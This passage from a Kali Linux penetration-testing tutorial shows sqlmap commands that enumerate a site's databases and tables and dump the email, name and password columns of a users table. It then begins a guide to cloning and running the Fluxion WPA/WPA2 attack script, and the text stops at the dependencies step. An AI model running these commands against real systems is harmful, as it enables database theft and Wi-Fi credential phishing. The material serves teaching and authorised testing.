    # Introduction


    Penetration testing is a good technique which can help you to keep your systems
    secure. It can help you to identify any loopholes or the weaknesses in your systems,
    commonly referred to as vulnerabilities. It is always good to detect these as
    early as possible before they can deploy the systems in a production environment,
    and this will help them stay safe. Once these loopholes are detected, you can
    go ahead and seal them. This shows the importance of doing penetration in your
    system. Kali Linux is the best operating system to do penetration testing. This
    book guides you on how to do this!


    # Chapter 1- Sqlmap for Website Hacking


    Sqlmap is simply a tool which makes it easy for us to do SQL injection. The tool
    is open source, and it can be used for penetration testing for automation of processes
    of detection and exploitation of SQL injection flaws then taking over the database
    servers.


    ### This tool has a very powerful detection engine, and other tools which can
    be used for penetration testing. You can use this tool for database fingerprinting,
    fetching of data from the database, accessing the file system, and execution of
    commands on your operating system.


    ### Sqlmap has full support for Oracle, MySQL, PostgreSQL, Microsoft Access, IBM
    DB2, Firebird, Sybase, SQLite SAP MaxDB, and Microsoft SQL Server database management
    systems. This means that almost all the available database management systems
    are supported.


    ### In this chapter, we will be showing you how to hack websites by use of Sqlmap
    in Kali Linux. This can be done by following the steps given below:Boot the machine
    running Kali Linux. Open the terminal, and type the following command:


    ```bash

    sqlmap -h

    ```


    All the basic commands which are supported by SqlMap will be listed. We can begin
    by executing a simple command which specifies the URL which is to be injected.
    This is shown below. This should take the following syntax:


    ```bash

    sqlmap -u <URL to inject>

    ```


    In our case, the command will be as shown below:


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1

    ```


    Sometimes, it may happen that the responses from the server are slow. In such
    a case, we can use the `--time-sec` which will help us to speed up the responses
    from our server. This can be added as shown in the command given below:


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 --time-sec 15

    ```


    Once the above commands are complete, you will be informed about the version of
    MySQL that you are using, as well as other relevant information regarding your
    system.


    Note that you may be prompted to answer some questions with either yes or no,
    as the commands are being executed, and this is determined by the author.


    ### Database


    We want to get names of databases. First, we will use the `--dbs` option to list
    the databases. This is shown below:


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 --dbs

    ```


    ### Table


    We are interested in the table. We will then use the `--tables` option to list
    the tables. Your command should then be as follows:


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 -D acuart --tables

    ```


    ### Data


    We should now get data from more columns. We will still use `-D` for the database,
    `-T` for the table, and `-C` for the column.


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 -D acuart -T users
    -C email,name,pass --dump

    ```


    # Chapter 2- How to Hack WPA/WPA2 without Brute Force


    Fluxion is a script which is based on linset. In fact, it is an improvement of
    the latter, offering fixes to some bugs and some additional options. This tool
    should only be used on the networks which you own.


    ### Fluxion


    For you to get the script, you have to clone the GitHub repository. The `git`
    command line tool can be used to do this as shown below:


    ```bash

    git clone https://github.com/deltaxflux/fluxion

    ```


    ### Running the Script


    Now that you have downloaded the scripts manually, you can navigate to the directory
    in which you have stored them. In this case, you only have to use the `cd` command
    so as to change to the fluxion directory. This is shown below:


    ```bash

    cd fluxion

    ```


    You can then run the script with sudo privileges. The following command demonstrates
    this:


    ```bash

    sudo ./fluxion

    ```


    ### Dependencies

